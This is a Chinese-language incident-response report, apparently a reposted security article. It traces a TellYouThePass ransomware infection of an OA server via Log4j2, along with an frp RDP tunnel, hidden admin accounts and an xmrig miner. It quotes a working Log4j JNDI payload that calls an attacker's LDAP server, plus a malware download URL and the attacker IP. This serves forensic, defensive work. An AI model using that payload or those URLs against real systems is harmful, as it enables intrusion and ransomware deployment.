# Apache Log4j2漏洞传播勒索病毒应急响应

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzI2NzE4MTI0MQ==&mid=2247486306&idx=1&sn=6c1939f96c476d99c86a563ab0414b4a&chksm=ea8386b4ddf40fa2df0eaacf868c2f88089c04b6f26166f9af5149a488e5fe8e0519bb268f7a&scene=126&sessionid=1681663127#rd](http://mp.weixin.qq.com/s?__biz=MzI2NzE4MTI0MQ==&mid=2247486306&idx=1&sn=6c1939f96c476d99c86a563ab0414b4a&chksm=ea8386b4ddf40fa2df0eaacf868c2f88089c04b6f26166f9af5149a488e5fe8e0519bb268f7a&scene=126&sessionid=1681663127#rd)

Apache Log4j2是一款非常优秀的Java日志框架，在各大Java项目中广泛应用。前段时间Apache Log4j2 的远程代码执行漏洞刷爆朋友圈，该漏洞一旦被攻击者利用会造成严重危害。而且此次漏洞影响巨大，很多互联网大厂都是此次 Log4j 远程代码执行漏洞的受害者。

“在12月13日，深信服终端安全团队和安服应急响应中心联合监测到一个名为Tellyouthepass的勒索病毒，该团伙已对双平台进行攻击。深信服捕获到大量Tellyouthepass勒索病毒拦截日志。”

近期我们也发现了此类勒索病毒事件。

  
01

# 事件起源

某日接到应急响应，一台OA服务器文件都被加密，OA服务打不开，文件的加密后缀为.locked。

  
02

# 现象确认

1\.    可以看到不少文件的后缀都被勒索病毒加密，加密后缀为“.locked”。

![](../Images/c20c41bedaf8fa40db2b2d104d14b15d.png)

2.在桌面发现一个勒索的通知文件“README.html”，将该文件打开后，发现一串密钥和黑客的邮箱地址。

![](../Images/70e8790cf259cf5de2d226a11a364389.png)

3.根据勒索文件后缀+勒索通知文件“README.html”等信息判断来看，该勒索病毒家族是TellYouThePass勒索病毒家族。近期检测到遭受Tellyouthepass勒索攻击的均为某OA系统。

【相关链接】:https://edr.sangfor.com.cn/#/information/news\_detail?id=829&type=blackmail

![](../Images/2daed4c27feaf6cce39f1d80f911b165.png)

4.根据该勒索病毒信息，了解到该病毒可能会新建账户，检查服务器本地账户后，确实发现2个被创建的隐藏账户，其中“xxxx$”(x为代指，和本文案例无关)有超级管理员Administrator权限。

![](../Images/d1e4ba25475c8e6f4c79ee0dacae9b1f.png)

  

  
03

# 事件排查

1.检查发现被加密文件的修改时间为2021年12月x日。

![](../Images/2cdf4b196117ddc65b3696b50b09d32b.png)

  

2.检查系统安全日志，无明显RDP爆破登录失败和SMB登录失败日志记录。

![](../Images/5cdfb3b8a2961c1aeaafb33c63be4844.png)

![](../Images/a10eabf6adea4a2866f595133fdd8e95.png)

3.检查态势感知设备上关于该主机的安全日志记录，发现在事件当天存在不少frp流量和Log4j漏洞利用攻击记录。

![](../Images/c43734659419122536bd6e8958c3f603.png)

4.通过everything检查发现OA服务器上存在frp客户端，并且存在一个xmrig可疑文件夹下。不过该frpc.exe文件的创建时间为几个月之前。

![](../Images/1f58b9d5ea5dfecf0fdbbdd3252c0206.png)

  

5.查看frp客户端配置文件，可以看到通过frp将OA服务器的RDP端口反弹到黑客VPS上。这意味着，可以通过访问该域名对应端口就能远程桌面访问到OA。

6.查看xmr文件，发现存在一个json的配置文件和一些其他脚本。

![](../Images/457bb52538a98c0a88deb182ca5b86f4.png)

  

7.打开config.json配置文件，里面发现mine.c3pool.com:33333挖矿域名和钱包地址。

![](../Images/ee13818f5fa9729753d446663fcb2457.png)

![](../Images/3cb74cb8c47991e1e7af9ac2f875a4fb.png)

8.通过start.vbs脚本分析来看，在xmrig文件夹下还有个xmrig.exe可执行文件。这应该是挖矿程序，不过后面应该是被删除了。

![](../Images/01d1fb0aa8b3f1eafc0bdb0607a7c26b.png)

9.继续分析态势感知的安全日志记录，发现在2021-12-x日 存在一条对OA服务器的log4j漏洞利用攻击记录，且OA服务器返回200 的状态码。

攻击payload：${jndi:ldap://193.56.29.207:443/Down}

其中IP：193.56.29.207应该是攻击者的VPS服务器IP，上面通过JAVA程序起了ldap服务。

![](../Images/1743070ea246188c88fcbf49649c20ac.png)

10.通过上网行为管理设备分析OA服务器的上网行为记录，发现在2021-12-X 某时有去访问http://193.56.29.207/ss64.exe可疑URL的记录，下载可执行文件。且IP与之前log4j漏洞利用攻击的VPS服务器IP一样。

![](../Images/38bab559f2af295fd555107f7739e964.png)

11.微步分析可疑IP:193.56.29.207，发现确实是一个国外的恶意IP，并被打上了Log4j2漏洞利用的标签。

![](../Images/0767c9811daf2f49377809ae180958f4.png)

  
04

# 排查结论

根据以上现象和日志分析初步判断：本次爆发的勒索病毒家族为：TellYouThePass勒索病毒家族，该病毒近期经常被不法分子通过Log4j2 漏洞利用对某OA系统进行漏洞入侵，攻击成功后通过命令执行下载勒索病毒文件加密服务器数据。

mine.c3pool.com
